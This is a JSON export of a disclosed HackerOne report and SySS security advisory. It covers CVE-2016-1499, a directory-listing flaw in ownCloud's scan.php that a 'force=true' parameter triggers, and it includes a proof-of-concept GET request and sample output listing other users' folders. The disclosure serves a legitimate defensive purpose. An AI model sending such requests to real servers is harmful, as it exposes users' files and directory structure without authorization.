{"id":110655,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTA2NTU=","url":"https://hackerone.com/reports/110655","title":"Information Exposure Through Directory Listing","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-01-14T12:42:43.692Z","submitted_at":"2016-01-14T12:42:43.692Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"erlijnvangenuchten","url":"/erlijnvangenuchten","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":3059,"url":"https://hackerone.com/owncloud","handle":"owncloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"ownCloud","twitter_handle":"ownCloud","website":"https://www.owncloud.com","about":"ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2016-1499"],"singular_disclosure_disabled":false,"disclosed_at":"2016-01-14T15:23:59.747Z","bug_reporter_agreed_on_going_public_at":"2016-01-14T15:23:59.664Z","team_member_agreed_on_going_public_at":"2016-01-14T13:00:16.006Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA512\n\nAdvisory ID: SYSS-2015-062\nProduct: ownCloud\nManufacturer: ownCloud Inc., Community\nAffected Version(s): ownCloud \u003c= 8.2.1, \u003c= 8.1.4, \u003c= 8.0.9\nTested Version(s): 8.1.1, 8.1.4\nVulnerability Type: Information Exposure Through Directory Listing (CWE-548)\nRisk Level: Medium\nSolution Status: Fixed\nManufacturer Notification: 2015-07-17\nSolution Date: 2015-12-23\nPublic Disclosure: 2016-01-05\nCVE Reference: CVE-2016-1499\nAuthor of Advisory: Dr. Erlijn van Genuchten (SySS GmbH)\n\n\nOverview:\n========\n\nownCloud is a software suite for creating and using file hosting\nservices.\n\nThe ownCloud Web site describes the software  as follows (see [1]):\n\n\"ownCloud is a self-hosted file sync and share server. It provides access \nto your data through a web interface, sync clients or WebDAV while \nproviding a platform to view, sync and share across devices easily — all \nunder your control. ownCloud’s open architecture is extensible via a \nsimple but powerful API for applications and plugins and it works with \nany storage.\"\n\n\nVulnerability Details:\n=================\n\nownCloud is vulnerable to information exposure through directory\nlisting. It is possible with a normal user to get information about\nthe complete directory structure and included files of all users.\nThe 'force' parameter in the script (index.php/apps/files/ajax/scan.php)\ncan easily be manipulated, by setting its value to 'true'.\n\nThis vulnerability can potentially be used for denial-of-service attacks\nif the selected directory is deep enough, because to index many\ndirectories requires high computational effort. In addition, sensitive\ninformation from other users is exposed.\n\n\nProof of Concept (PoC):\n====================\n\nWith the following HTTP GET request, it is possible to see the\ndirectories of other users.\n\n```\nGET /index.php/apps/files/ajax/scan.php?force=true\u0026dir=\u0026requesttoken=\u003cVALIDREQUESTTOKEN\u003e HTTP/1.1\nHost: [HOST]\nAccept: text/event-stream\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: [REFERER]\nCookie: [COOKIES]\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n```\n\nServer response (shortened):\n\nevent: user\ndata: \"[ID]\"\n\nevent: folder\ndata: \"\\/\"\n\nevent: count\ndata: 21\n\nevent: count\ndata: 42\n\nevent: count\ndata: 63\n\nevent: folder\ndata: \"\\/[ID]\"\n\nevent: folder\ndata: \"\\/[ID]\\/cache\"\n\nevent: folder\ndata: \"\\/[ID]6\\/files\"\n\nevent: folder\ndata: \"\\/[ID]\\/files_encryption\"\n\n[...]\n\nevent: folder\ndata: \"\\/[ID]\\/files_encryption\\/keys\\/files\\/[FILENAME].zip\"\n\nevent: folder\ndata: \"\\/[ID]\\/files_encryption\\/keys\\/files\\/[FILENAME].zip\\/OC_DEFAULT_MODULE\"\n\nevent: folder\ndata: \"\\/[ID]\\/files_encryption\\/keys\\/files\\/[FILENAME].pptx\"\n\n[...]\n\n\nSolution:\n========\n\nAccording to information by ownCloud, the described security issue has\nbeen fixed in software releases:\n– ownCloud 8.2.2\n– ownCloud 8.1.5\n– ownCloud 8.0.10\n\nPlease contact the manufacturer for further information or support or \nvisit https://owncloud.org/security/advisory/?id=oc-sa-2016-002.\n\n\nDisclosure Timeline:\n=================\n\n2015-11-17: Vulnerability reported to manufacturer\n2015-12-23: Patch published by manufacturer\n2016-01-05: Public release of security advisory\n\n\nReferences:\n==========\n\n[1] ownCloud, Web Site\n    https://owncloud.org/\n[2] SySS Security Advisory SYSS-2015-062\n    https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2015-062.txt\n[3] SySS Responsible Disclosure Policy\n    https://www.syss.de/en/news/responsible-disclosure-policy/\n\n\nCredits:\n=======\n\nThis security vulnerability was found by Dr. Erlijn van Genuchten of the\nSySS GmbH.\n\nE-Mail: erlijn.vangenuchten@syss.de\nPublic Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Erlijn_vanGenuchten.asc\nKey ID: 0xBD96FF2A\nKey Fingerprint: 17BB 4CED 755A CBB3 2D47 C563 0CA5 8637 BD96 FF2A\n\n\nDisclaimer:\n=========\n\nThe information provided in this security advisory is provided \"as is\" and \nwithout warranty of any kind. Details of this security advisory may be updated \nin order to provide as accurate information as possible. The latest version of \nthis security advisory is available on the SySS Web site.\n\n\nCopyright:\n=========\n\nCreative Commons - Attribution (by) - Version 3.0\nURL: http://creativecommons.org/licenses/by/3.0/deed.en\n-----BEGIN PGP SIGNATURE-----\nVersion: GnuPG v1\n\niQIcBAEBCgAGBQJWlR69AAoJEAylhje9lv8qjHMQAJWT/wIjZTFwkBdQtkLNHXuP\n+roCh4sCsEwaykZDFeILIgjpx4cWm9lga2/C/B0fj/UDDQrgInfEi7CmBZ32u/0m\niXcV250/Yy9+lYasVpHRxKU4ef3b3rkK4Yf3thaMQPO1KP5LvRXyL//I597mv4Co\ne/gVn4CHZASmcj1hq9AQqbXi7t68pe6kjhWYfs1/qNbRd9g8b8o1u+e1bF2E4J+Z\nt4PKOxuNgzZOy7ZmxRLO3dbFVFLLUVG6XxoqVk2fU5l9WUm6cO3d5md7m+zEoo9s\nxLTEsRIzZ/KccPsNMHmPUMNOXsxh71a4BrkA1y4BYjyXn2KrAMLHEWa7H0SeE9yo\nc6QmGf6STdvu8mgt9fCJvN7U3h2pllyq5rJi/MEPHZB4Q6rt1Kk8SNuel+C6zFJK\n/8g8qVbwz3IW3Iluz6n8mVSZfKfHPooOX6C7NcK2tIFXNBWgrIhKVXWVHsZyDUtc\nZdjqvIg0YxElLBHLei3OTDTmEDV6RLbe5aIhMWMLzuG6kSY4ZXrGQ1BKhh5Z5t4l\ng/2+f/bHSZouZ9a6UCGJWXb1sGofcbfb/9pK7FirIn8M8OI/FyvKfQiVh2gQPZtw\n0/J4pvREv/09r+tIK/VWjz0UR+eZp81qhljZlhEHWD/fPYBgRgXFRHfh7TzeOrVK\na8dhY20fJ7J+0dPBSoAp\n=gYnI\n-----END PGP SIGNATURE-----\n","bounty_amount":"250.0","formatted_bounty":"$250","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-02-13T13:00:16.084Z","allow_singular_disclosure_after":-178590284.08840564,"singular_disclosure_allowed":true,"vote_count":1,"voters":["realtess"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":757580,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. We take security very seriously and would appreciate if you would not share any information about this bug until we have determined a potential patch.\r\n \r\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster.","automated_response":true,"created_at":"2016-01-14T12:42:43.888Z","updated_at":"2016-01-14T12:42:43.888Z","actor":{"url":"/owncloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"ownCloud"}},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":757592,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This submission as been submitted initially via security@owncloud.com and has meanwhile been resolved in ownCloud 8.2.2, 8.1.5 and 8.0.10.\n\nAs a further hardening the specific endpoint has been removed for ownCloud 9.0 and will be replaced with a cronjob. \n\nThis vulnerability has been assigned [CVE-2016-1499](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1499), and [oC-SA-2016-002](https://owncloud.org/security/advisory/?id=oc-sa-2016-002).","automated_response":false,"created_at":"2016-01-14T12:53:52.670Z","updated_at":"2016-01-14T13:03:45.552Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"erlijnvangenuchten","url":"/erlijnvangenuchten"},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":757596,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Congratulations. The bug bounty panel has deemed this report to be eligible for a bounty of $250.\n\nAs a side remark for the bounty consideration: An access to the _content_ of these files was not possible, this vulnerability is strictly limited to a directory enumeration usually only leaking the directory structure (if the encryption app is enabled also the file names). This is thus considered a medium severity vulnerability by @ownCloud.","automated_response":false,"created_at":"2016-01-14T13:00:10.115Z","updated_at":"2016-01-14T13:05:31.760Z","actor":{"url":"/owncloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"ownCloud"}},"bounty_amount":"250.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"owncloud","collaborator":{"username":"erlijnvangenuchten","url":"/erlijnvangenuchten"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":757598,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-01-14T13:00:16.029Z","updated_at":"2016-01-14T13:00:16.029Z","first_to_agree":true,"actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":757758,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-01-14T15:23:59.689Z","updated_at":"2016-01-14T15:23:59.689Z","actor":{"username":"erlijnvangenuchten","cleared":false,"url":"/erlijnvangenuchten","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":757759,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-01-14T15:23:59.770Z","updated_at":"2016-01-14T15:23:59.770Z","actor":{"username":"erlijnvangenuchten","cleared":false,"url":"/erlijnvangenuchten","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}